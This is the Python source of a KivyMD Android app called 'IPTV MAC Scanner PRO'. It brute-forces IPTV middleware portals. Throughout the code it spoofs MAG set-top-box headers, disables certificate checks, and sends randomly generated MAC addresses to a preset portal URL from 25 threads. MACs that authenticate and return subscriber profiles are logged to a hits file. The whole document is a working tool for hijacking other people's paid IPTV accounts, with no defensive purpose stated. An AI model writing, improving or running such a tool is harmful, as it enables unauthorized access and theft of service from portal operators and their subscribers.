"""
Professional IPTV MAC Scanner PRO - High Performance & Fixed UI Version
- Fixed Text overlap by stripping hardcoded textfield heights.
- Fixed Broken character glyph before STATUS text.
- Optimized Batch UI Updates & Log Limiting to Prevent Freezing on Pydroid.
Compatible with: KivyMD 1.2.0 + Kivy 2.3.x (Pydroid3 / Android)
"""

from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.bottomnavigation import MDBottomNavigation, MDBottomNavigationItem
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.card import MDCard
from kivymd.uix.label import MDLabel
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.progressbar import MDProgressBar
from kivymd.uix.scrollview import MDScrollView
from kivymd.uix.list import MDList, OneLineListItem
from kivymd.uix.toolbar import MDTopAppBar

from kivy.lang import Builder
from kivy.clock import Clock
from kivy.properties import StringProperty, NumericProperty, BooleanProperty, ListProperty
from kivy.metrics import dp
from kivy.utils import get_color_from_hex

import threading
import requests
import random
import time
import datetime
import os
from queue import Queue

# تعطيل تحذيرات الحماية لطلبات HTTP غير المشفرة أو الشهادات الذاتية
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KV = """
#:import dp kivy.metrics.dp
#:import get_color_from_hex kivy.utils.get_color_from_hex

<StatCard>:
    size_hint_y: None
    height: dp(90)
    orientation: "vertical"
    padding: dp(10)
    radius: [14]
    elevation: 2
    md_bg_color: app.theme_cls.bg_dark

    MDLabel:
        text: root.value
        halign: "center"
        bold: True
        font_style: "H5"
        theme_text_color: "Custom"
        text_color: root.accent_color

    MDLabel:
        text: root.title
        halign: "center"
        font_style: "Caption"
        theme_text_color: "Secondary"


<DashboardScreen>:
    name: "dashboard"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "IPTV MAC Scanner PRO v4"
            md_bg_color: app.theme_cls.primary_color

        MDScrollView:
            do_scroll_x: False

            MDBoxLayout:
                orientation: "vertical"
                spacing: dp(12)
                padding: dp(12)
                size_hint_y: None
                height: self.minimum_height

                # ── الإحصائيات ──
                MDBoxLayout:
                    spacing: dp(10)
                    size_hint_y: None
                    height: dp(90)

                    StatCard:
                        title: "TOTAL"
                        value: root.total_requests
                        accent_color: app.theme_cls.primary_light

                    StatCard:
                        title: "HITS"
                        value: root.success_hits
                        accent_color: get_color_from_hex("#00E676")

                    StatCard:
                        title: "ERRORS"
                        value: root.errors
                        accent_color: get_color_from_hex("#FF5252")

                # ── الإعدادات المصححة والمحمية من التداخل ──
                MDCard:
                    orientation: "vertical"
                    padding: dp(14)
                    spacing: dp(14)
                    size_hint_y: None
                    height: self.minimum_height
                    radius: [14]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: "TARGET CONFIGURATION"
                        bold: True
                        size_hint_y: None
                        height: dp(25)

                    MDTextField:
                        id: target_url
                        hint_text: "Portal URL"
                        text: "http://fortv.cc:8080/"
                        mode: "rectangle"
                        # تم ترك الارتفاع للتكيف التلقائي لمنع تداخل الحروف ونصوص الـ Hint

                    MDBoxLayout:
                        spacing: dp(10)
                        size_hint_y: None
                        height: self.minimum_height

                        MDTextField:
                            id: threads
                            hint_text: "THREADS"
                            text: "25"
                            mode: "rectangle"
                            input_filter: "int"

                        MDTextField:
                            id: timeout
                            hint_text: "TIMEOUT"
                            text: "7"
                            mode: "rectangle"
                            input_filter: "float"

                # ── شريط التقدم والحالة ──
                MDCard:
                    orientation: "vertical"
                    padding: dp(12)
                    spacing: dp(8)
                    size_hint_y: None
                    height: dp(95)
                    radius: [14]
                    elevation: 2
                    md_bg_color: app.theme_cls.bg_dark

                    MDLabel:
                        text: root.status
                        bold: True
                        font_style: "Body1"

                    MDProgressBar:
                        id: progress_bar
                        value: root.progress
                        color: app.theme_cls.primary_color

                    MDLabel:
                        text: root.progress_text
                        halign: "right"
                        font_style: "Caption"

                # ── أزرار التحكم ──
                MDBoxLayout:
                    spacing: dp(10)
                    size_hint_y: None
                    height: dp(52)

                    MDRaisedButton:
                        id: btn_start
                        text: "START"
                        md_bg_color: get_color_from_hex("#00897B")
                        on_release: root.start_scan()

                    MDRaisedButton:
                        id: btn_stop
                        text: "STOP"
                        md_bg_color: get_color_from_hex("#B71C1C")
                        on_release: root.stop_scan()
                        disabled: True

                    MDRaisedButton:
                        text: "CLEAR"
                        md_bg_color: get_color_from_hex("#5D6266")
                        on_release: root.clear_logs()

                # ── السجل الحي ──
                MDCard:
                    orientation: "vertical"
                    radius: [14]
                    padding: dp(8)
                    md_bg_color: get_color_from_hex("#0D1117")
                    size_hint_y: None
                    height: dp(260)

                    MDLabel:
                        text: "LIVE LOG"
                        bold: True
                        size_hint_y: None
                        height: dp(25)
                        theme_text_color: "Custom"
                        text_color: get_color_from_hex("#8B949E")

                    MDScrollView:
                        id: log_scroll
                        MDList:
                            id: logs_list
                            size_hint_y: None
                            height: self.minimum_height


<SettingsScreen>:
    name: "settings"

    MDBoxLayout:
        orientation: "vertical"

        MDTopAppBar:
            title: "Hits Dashboard"
            md_bg_color: app.theme_cls.primary_color

        MDLabel:
            text: "Saved Hits Panel\\nCheck 'hits.txt' in your storage"
            halign: "center"
            theme_text_color: "Secondary"
"""

class StatCard(MDCard):
    title = StringProperty("")
    value = StringProperty("0")
    accent_color = ListProperty([1, 1, 1, 1])

class DashboardScreen(MDScreen):
    total_requests = StringProperty("0")
    success_hits = StringProperty("0")
    errors = StringProperty("0")
    progress = NumericProperty(0)
    progress_text = StringProperty("0 / 0 (0%)")
    status = StringProperty("* STATUS: IDLE") # تم تغيير الرمز الغريب هنا ليعمل بسلاسة
    running = BooleanProperty(False)

    DEFAULT_PREFIX = "00:1A:79"
    HEX_START = 0x000000
    HEX_END = 0xFFFFFF
    MAX_LOG_ITEMS = 50 

    def start_scan(self):
        if self.running:
            return

        base_url = self.ids.target_url.text.strip()
        if not base_url:
            self.status = "[!] STATUS: URL EMPTY"
            return

        self.running = True
        self.status = "[>] STATUS: RUNNING" # رمز سهم واضح ومتوافق مع أندرويد
        self.ids.btn_start.disabled = True
        self.ids.btn_stop.disabled = False
        self.ids.logs_list.clear_widgets()

        self.total = 0
        self.hits = 0
        self.errors_count = 0
        self._tested_values = set()
        
        self.ui_queue = Queue()

        self.batch_size = max(self.HEX_END - self.HEX_START, 1)
        self.thread_count = int(self.ids.threads.text or 25) # تم تعديل القيمة الافتراضية إلى 25 خيط لسرعة قصوى
        self.timeout_val = float(self.ids.timeout.text or 7.0)

        Clock.schedule_interval(self.consume_ui_queue, 0.4)

        threading.Thread(target=self.run_scanner, args=(base_url,), daemon=True).start()

    def stop_scan(self):
        self.running = False
        self.status = "[-] STATUS: STOPPED"
        self.ids.btn_start.disabled = False
        self.ids.btn_stop.disabled = True
        Clock.unschedule(self.consume_ui_queue)

    def run_scanner(self, base_url):
        portal = f"{base_url if base_url.endswith('/') else base_url + '/'}portal.php"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250',
            'X-User-Agent': 'model=MAG250;ver=0;features=6',
            'Referer': base_url
        }

        session = requests.Session()
        
        try:
            self.ui_queue.put(("LOG", ("System", "Initiating Handshake...")))
            session.get(f"{portal}?type=stb&action=handshake", headers=headers, timeout=self.timeout_val, verify=False)
            self.ui_queue.put(("LOG", ("System", "Handshake Established Successfully!")))
        except Exception as e:
            err_msg = str(e)
            self.ui_queue.put(("LOG", ("Error", f"Handshake Failed: {err_msg}")))
            Clock.schedule_once(lambda dt: self.stop_scan())
            return

        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            while self.running and self.total < self.batch_size:
                val = random.randint(self.HEX_START, self.HEX_END)
                if val in self._tested_values:
                    continue
                self._tested_values.add(val)

                mac = self.build_mac(val)
                executor.submit(self.check_mac, session, portal, mac, headers)
                time.sleep(0.01) # تقليل المهلة الزمنية لرفع كفاءة سحب الخيوط

    def check_mac(self, session, portal, mac, headers):
        if not self.running:
            return
        
        try:
            auth_url = f"{portal}?type=itv&action=do_auth"
            res = session.get(auth_url, cookies={'mac': mac}, headers=headers, timeout=self.timeout_val, verify=False)
            
            if "token" in res.text.lower() and len(res.text) > 20:
                profile_url = f"{portal}?type=stb&action=get_profile"
                prof = session.get(profile_url, cookies={'mac': mac}, headers=headers, timeout=self.timeout_val, verify=False)
                
                if "expiry" in prof.text or "parent_password" in prof.text:
                    self.ui_queue.put(("DATA", (mac, "HIT")))
                else:
                    self.ui_queue.put(("DATA", (mac, "MISS")))
            else:
                self.ui_queue.put(("DATA", (mac, "MISS")))
        except:
            self.ui_queue.put(("DATA", (mac, "ERROR")))

    def consume_ui_queue(self, dt):
        has_updates = False
        
        while not self.ui_queue.empty():
            q_type, q_data = self.ui_queue.get()
            
            if q_type == "LOG":
                tag, msg = q_data
                self.add_log(tag, msg)
            
            elif q_type == "DATA":
                mac, level = q_data
                self.total += 1
                
                if level == "HIT":
                    self.hits += 1
                    self.add_log("HIT", mac)
                    try:
                        with open("hits.txt", "a") as f:
                            f.write(f"HIT: {mac} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    except:
                        pass
                elif level == "ERROR":
                    self.errors_count += 1
                    self.add_log("ERR", mac)
                else:
                    self.add_log("TRY", mac)
                    
                has_updates = True

        if has_updates:
            self.total_requests = str(self.total)
            self.success_hits = str(self.hits)
            self.errors = str(self.errors_count)
            
            pct = min(int((self.total / self.batch_size) * 100), 100)
            self.progress = pct
            self.progress_text = f"{self.total} / {self.batch_size} ({pct}%)"

    def build_mac(self, value):
        suffix = f"{value:06X}"
        return ":".join([self.DEFAULT_PREFIX] + [suffix[i:i+2] for i in range(0, 6, 2)])

    def add_log(self, tag, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        logs_list = self.ids.logs_list
        
        logs_list.add_widget(OneLineListItem(text=f"[{timestamp}] {tag} | {message}"))
        
        if len(logs_list.children) > self.MAX_LOG_ITEMS:
            logs_list.remove_widget(logs_list.children[-1])
            
        setattr(self.ids.log_scroll, "scroll_y", 0)

    def clear_logs(self):
        self.ids.logs_list.clear_widgets()


class SettingsScreen(MDScreen):
    pass


class MainApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "Teal"
        self.theme_cls.theme_style = "Dark"

        Builder.load_string(KV)

        nav = MDBottomNavigation()
        dash = DashboardScreen()
        settings = SettingsScreen()

        tab1 = MDBottomNavigationItem(name="scanner", text="Scanner", icon="radar")
        tab1.add_widget(dash)
        tab2 = MDBottomNavigationItem(name="history", text="History", icon="history")
        tab2.add_widget(settings)

        nav.add_widget(tab1)
        nav.add_widget(tab2)
        return nav

if __name__ == "__main__":
    MainApp().run()
